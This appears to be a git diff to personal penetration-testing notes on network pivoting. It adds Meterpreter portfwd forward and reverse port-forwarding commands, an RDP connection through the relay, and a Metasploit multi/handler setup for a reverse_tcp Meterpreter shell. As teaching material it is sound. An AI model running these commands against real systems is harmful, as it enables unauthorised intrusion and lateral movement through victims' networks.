@@ -106,6 +106,7 @@ msf6 > use post/multi/manage/autoroute
 ```bash
 $ proxychains nmap ...
 ```
+![[meterpreter-socks-proxy.drawio.png]]
 
 ## Port Forwarding
 Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
@@ -203,3 +204,58 @@ debug1: confirm forwarded-tcpip
 debug1: channel 0: connected to 0.0.0.0 port 8000
 ```
 ![[pivot-reverse-shell-2.webp]]
+
+### Port forwarding using Meterpreter
+The `portfwd` module in [[Meterpreter]] can be used to forward traffic from our attack machine on received a particular port onwards to a remote host on another network.
+```bash
+meterpreter > help portfwd
+
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+OPTIONS:
+
+    -h        Help banner.
+    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
+    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
+    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
+    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
+    -r <opt>  Forward: remote host to connect to.
+    -R        Indicates a reverse port forward.
+```
+```bash
+# This command creates a listener on the attack host's local port (-l) 3300
+# It then forwards all packets to the remote (-r) server x.x.x.x on port 3389 (-p) via our session
+meterpreter > portfwd add -l 3300 -p 3389 -r x.x.x.x
+
+[*] Local TCP relay crated: :3300 <-> x.x.x.x:3389
+```
+
+We could then direct the traffic from a tool like `xfreerdp` to use the attack machine's local port and be forwarded to the remote server
+```bash
+$ xfreerdp /v:localhost:3300 /u:<user> /p:<pass>
+```
+
+### Reverse port forwarding with Meterpreter
+This is used for forwarding a reverse connection from a target to our attack machine via a pivot host.
+1. Configure the reverse port forward on the pivot host's meterpreter session using `portfwd`
+```bash
+# This command specifies a reverse (-R) connection
+# forwarding any receieved traffic on the pivot host's port (-p) 1234
+# to our attack machine (-L) on port (-l) 8081
+meterpreter > portfwd add -R -p 1234 -l 8081 -L <attack_machine_ip>
+```
+2. We can then setup the `multi/handler` listener on our attack machine to wait for the connection
+```bash
+meterpreter > bg
+[*] Backgrounding session 1...
+
+msf6 > use exploit/multi/handler
+> set payload windows/x64/meterpreter/reverse_tcp
+> set LHOST 0.0.0.0
+> set LPORT 8081
+> run
+
+[*] Started reverse TCP handler on 0.0.0.0:8081
+```
+3. We then create the reverse shell payload for the target system, that will connect to our pivot host on port `1234`
+4. Once we transfer and execute the payload on the target system, we should see the reverse connection get forwarded all the way back to our attack machine's listener
